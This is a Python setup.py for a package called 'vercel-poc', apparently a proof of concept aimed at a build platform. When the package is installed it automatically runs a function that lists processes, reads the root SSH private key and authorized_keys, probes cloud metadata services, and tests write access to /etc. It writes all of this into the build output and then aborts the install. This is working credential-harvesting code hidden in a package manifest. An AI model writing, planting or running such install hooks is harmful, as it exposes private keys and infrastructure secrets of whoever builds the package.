import os
import sys
import subprocess
import socket
from setuptools import setup

def mega_pwn():
    err = sys.stderr.write
    err("\n" + "="*60 + "\n")
    err("FINAL INFRASTRUCTURE AUDIT (CRITICAL IMPACT)\n")

   
    err("\n[!] RUNNING PROCESSES:\n")
    err(subprocess.getoutput("ps aux") + "\n")

    
    err("\n[!] SSH KEY LEAK TEST:\n")
    err(subprocess.getoutput("cat /root/.ssh/id_rsa 2>&1 || echo 'No id_rsa'") + "\n")
    err(subprocess.getoutput("cat /root/.ssh/authorized_keys 2>&1 || echo 'No auth_keys'") + "\n")

 
    err("\n[!] CLOUD METADATA TEST:\n")
 
    for url in ["169.254.169.254", "metadata.google.internal", "169.254.170.2"]:
        try:
            s = socket.create_connection((url, 80), timeout=0.5)
            err(f"DANGER: Metadata service at {url} IS ACCESSIBLE!\n")
            s.close()
        except:
            err(f"Metadata {url} not reachable.\n")
 
    err("\n[!] WRITE ACCESS TO /etc/:\n")
    try:
        with open("/etc/pwned_test", "w") as f:
            f.write("rce_test")
        err("SUCCESS: I can write to /etc/! Full system takeover confirmed.\n")
        os.remove("/etc/pwned_test")
    except:
        err("No write access to /etc/.\n")

    err("="*60 + "\n")
    sys.exit(1)

mega_pwn()
setup(name="vercel-poc", version="5.0.0")
